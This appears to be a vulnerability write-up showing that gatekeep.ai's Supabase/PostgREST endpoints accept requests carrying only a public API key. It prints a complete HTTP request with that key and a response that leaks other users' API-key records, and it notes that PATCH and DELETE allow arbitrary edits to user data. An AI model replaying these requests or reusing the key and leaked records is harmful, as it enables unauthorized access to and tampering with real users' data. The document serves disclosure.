# `app.gatekeep.ai` Data leakage && Arbitrary Database operation via lack of authorization in exposed `RESTful API` Endpoint

This finding derived from an exploration in the API manage endpoint at `platform.gatekeep.ai` after that I escalated further into a wider affection at `app.gatekeep.ai`, around `1019` data are leaked and via this `RESTful endpoint`, we can do arbitrary actions on it like changing `emails`, `price_id`.

## `platform.gatekeep.ai`

This all started when viewing the `burpsuite` browsing history, we found that something suspicious:

![image-20240416212718914](https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202404162127941.png)

`platform.gatekeep.ai` seemed to interact with an `OpenAPI` endpoint remotely to fetch information! It used statements such as `eq.xxxx` to match, with code `PGRST`, we may know that the server is using `postgrest`, `RESTful endpoint for PostgreSQL` . This can be seemed as a normal standard of fetching users data. Nevertheless, something fun came out

Despite the fact that this endpoints required `Apikey` and `Authorization` Header for Authorization, Nevertheless, by try and erroring, we found out only `Apikey` header is required for a validated request. Furthermore, what if we try to fetch more data other than the specified `user_id`? 

```yaml
GET /rest/v1/api_keys?select=* HTTP/2
Host: gajfamycuarfxfdvlgie.supabase.co
X-Client-Info: supabase-js-web/2.40.0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdhamZhbXljdWFyZnhmZHZsZ2llIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTEzODM0NzcsImV4cCI6MjAyNjk1OTQ3N30.PwWIQLjyxnsBYEMjo5khf3vFcDxlLrEbATNgDQWdZ4w
Sec-Ch-Ua-Platform: ""
Accept: */*
Origin: https://platform.gatekeep.ai
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://platform.gatekeep.ai/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

Furthermore, by removing the `user_id` specification with replacing Accept with `application/json`, it seems like we are able to dump data out! In this case, its user `api_keys `and stuffs.

```yaml
HTTP/2 200 OK
Date: Mon, 15 Apr 2024 14:12:38 GMT
Content-Type: application/json; charset=utf-8
Content-Range: 0-4/*
Cf-Ray: 874c881aebdacfd9-SJC
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: https://platform.gatekeep.ai
Content-Location: /api_keys?select=%2A
Strict-Transport-Security: max-age=15552000; includeSubDomains
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
X-Envoy-Upstream-Service-Time: 15
Vary: Accept-Encoding
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

[{"id":"893ff589-3eaf-4f1a-ad6f-a5ef434386ef","user_id":"d0f48aeb-675e-4871-8bbd-a83fa0424515","key_name":"test","hashed_key":"3ea4431ef2b52110e101ee71550c24887f4cde022770dc9f183dcaa6154d8c2b","last_four":"9OIN","created_at":"2024-04-11T21:00:32.069389+00:00","last_used":null}, 
 {"id":"8e510743-504e-4868-aac0-c4fbd88e98e7","user_id":"d0f48aeb-675e-4871-8bbd-a83fa0424515","key_name":"local","hashed_key":"8b4848791ab0e4fd8657be311f51fb613cf65b112c406a55abfb7ad5fddd89d7","last_four":"Yha2","created_at":"2024-04-12T07:02:54.478804+00:00","last_used":null}, 
 {"id":"170b8d18-5c87-429d-81f4-a8745d527cf6","user_id":"28ea7be4-9c75-42d5-b7ad-ff6e99da16c0","key_name":"Test","hashed_key":"e5620810006de761a3b2b615054370f04f722f860cf143c602f28dc70c336f5b","last_four":"C6wG","created_at":"2024-04-12T12:30:40.712439+00:00","last_used":null}, 
 {"id":"de439174-7171-41f6-8064-221134d1e0e9","user_id":"8a3c43bf-9b60-42c5-9403-c8a662d0901d","key_name":"GateKeep Engine","hashed_key":"b9ad6cfba99968358809f507202c18cb70c0ce5232e476e095f00538c6e3f8f0","last_four":"T6Yy","created_at":"2024-04-12T12:51:03.30052+00:00","last_used":null}, 
 {"id":"754052f1-1d7b-4394-98c9-f705ac369b09","user_id":"fa62ed91-c79b-4344-b354-b2c1496fc741","key_name":"Michael Bollox","hashed_key":"a90e5d87aee6d11680357a1506559b279c4e1f7f8d96cf446726ec16e5f9e679","last_four":"gI7E","created_at":"2024-04-13T14:50:27.298948+00:00","last_used":null}]
```

### Further exploitation

What's more, by examine the `/rest/v1/` with `get`, you can obtain all available endpoints in the format of `Swagger`, after examine them carefully, we found these endpoint also exploitable:

* `/accounts`: All user related data, looks like this: (38 data when i wrote this)

  ![image-20240416214017969](C:\Users\Retr0\AppData\Roaming\Typora\typora-user-images\image-20240416214017969.png)

* `/api_keys`: Storing `API_KEYS` for users, with hashed keys and stuffs

  ```json
   {
   	"id":"49970346-3b27-4b12-b331-f35abc1a3bc5",
       "user_id":"74f38a46-53ec-4449-a4fc-76851a53ed3a",
       "key_name":"123",
       "hashed_key":"10ccd3084055e42825049fa4c72003f85e918c0c3eef9d2f3caa615aa668adee",
       "last_four":"3y9x",
       "created_at":"2024-04-16T12:24:37.7566+00:00",
       "last_used":null
   }
  ```



## `app.gatekeep.ai`

After that, considering the impacts of this vulnerability, we decided to explore further escalate this vulnerability to a wider range by coping with other vulnerability/others, after a hour of examine, another fun finding appeared on the http history, we found that the `app.gatekeep.ai` is actually using a similar superbase endpoint. Just as what we did previously, we found out that this `supabase` expose way more API then `platform.gatekeep.ai`! Such as:

* `/diagram_cache`
* `/discord_users`
* `/users`
* `/user_videos`
* ....

Furthermore, in `app.gatekeep.ai`, `PATCH` , `DELETE` provided in both endpoints provided us possibility to edit users information, it means that we can edit arbitrary stored information via this endpoint.

![image-20240416203808709](https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202404162038738.png)

*(About 1019 user data being leaked on `app.gatekeep.ai`)*

